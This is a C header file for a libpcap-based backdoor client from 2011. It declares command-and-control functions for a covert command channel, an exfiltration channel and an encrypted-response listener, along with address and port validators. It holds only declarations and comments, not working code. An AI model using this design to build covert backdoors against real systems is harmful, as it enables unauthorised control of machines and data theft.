#ifndef CLIENT_H
#define CLIENT_H

/*
SOURCE FILE: client.h

PROGRAM: Backdoor - A simple two in one backdoor client/server using libpcap

DATE: October 23, 2011

REVISIONS:
	1.0 - October 23

DESIGNERS:
	Santana Mach and Steve Stanisic

PROGRAMMERS:
	Santana Mach and Steve Stanisic

NOTES: This file contains the command and control client functionality.
*/

#include "defs.h"

/*
FUNCTION: backdoor_client

PARAMS:
	char *ipaddr: The remote host's ip address.
	int dport: The port the remote host is "listening" on.
	int cchan: Protocol for covert channel.
	int xchan: Protocol for exfiltration channel.

RETURN: none.

NOTES: Call this function to start reading commands from standard input
	and sending them to the backdoor.
*/
void backdoor_client(uint32 ipaddr, int dport, int cchan, int xchan);
/*
FUNCTION: listen_thread

PARAMS:
	void *arg: (sockaddr_in*) The remote address we are communicating with.

RETURN: none.

NOTES: This thread func is suitable for listening for encrypted
	responses from the remote host. It will loop until the shutdown
	variable is set.
*/
void *listen_thread(void *arg);
/*
FUNCTION: val_addr

PARAMS:
	char *addr: The host address to check.

RETURN: Non-zero if this is a valid address, 0 otherwise.

NOTES: Call this function to see if a string can be interpreted as an
	IP address.
*/
int val_addr(char *addr);
/*
FUNCTION: val_port

PARAMS:
	int port: The port to check.

RETURN: Non-zero if this is a valid port, 0 otherwise.

NOTES: Call this function to see if an integer can be interpreted as a
	UDP port.
*/
int val_port(int port);

void* exfil_listen(void *arg);

#endif
